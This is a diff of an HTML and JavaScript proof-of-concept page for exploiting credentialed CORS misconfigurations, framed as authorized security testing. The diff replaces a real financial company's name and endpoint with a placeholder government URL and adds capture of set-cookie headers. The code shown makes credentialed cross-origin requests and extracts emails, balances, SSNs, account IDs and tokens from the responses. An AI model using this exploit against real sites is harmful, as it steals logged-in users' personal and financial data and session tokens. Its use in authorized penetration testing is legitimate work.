@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Zerodha CORS Credentialed PoC — Local Only</title>
+  <title>Credentialed CORS PoC — Local Only</title>
   <style>
     body{font-family:system-ui,Arial;padding:1rem;line-height:1.4}
     pre{white-space:pre-wrap;border:1px solid #ddd;padding:1rem;background:#f9f9f9;max-height:60vh;overflow:auto}
@@ -12,11 +12,11 @@
   </style>
 </head>
 <body>
-  <h2>Zerodha CORS Credentialed PoC — Local Use Only</h2>
-  <p class="warn">Only run this with explicit written authorization from Zerodha. Do not host publicly. Use a dedicated browser profile logged into the authorized test account.</p>
+  <h2>Credentialed CORS PoC — Local Use Only</h2>
+  <p class="warn">Only run this with explicit, written authorization from the target organization. Do not host publicly. Use a dedicated browser profile logged into the authorized test account.</p>
 
   <label>Endpoint URL:
-    <input id="endpoint" type="text" value="https://zerodha.com/z-connect/wp-json/wp/v2/pages/664">
+    <input id="endpoint" type="text" value="https://target.example.gov/protected/api">
   </label>
 
   <label>Mode:
@@ -68,7 +68,8 @@ document.getElementById('run').addEventListener('click', async () => {
       'access-control-allow-credentials: ' + (headers['access-control-allow-credentials'] || 'Not Present'),
       'access-control-allow-methods: ' + (headers['access-control-allow-methods'] || 'Not Present'),
       'access-control-allow-headers: ' + (headers['access-control-allow-headers'] || 'Not Present'),
-      'vary: ' + (headers['vary'] || 'Not Present')
+      'vary: ' + (headers['vary'] || 'Not Present'),
+      'set-cookie: ' + (headers['set-cookie'] || 'Not Present')
     ].join('\\n');
 
     // Read body safely and try to extract common sensitive fields
@@ -95,12 +96,10 @@ document.getElementById('run').addEventListener('click', async () => {
     const extracted = {};
     try {
       if (parsed && typeof parsed === 'object') {
-        // common fields to look for
         const keys = ['email','email_address','name','full_name','username','balance','account_id','phone','ssn','id','token'];
         for (const k of keys) {
           if (k in parsed) extracted[k] = parsed[k];
         }
-        // also check nested 'data' or arrays first element
         if (!Object.keys(extracted).length && parsed.data) {
           const cand = parsed.data[0] || parsed.data;
           for (const k of keys) if (cand && k in cand) extracted[k] = cand[k];
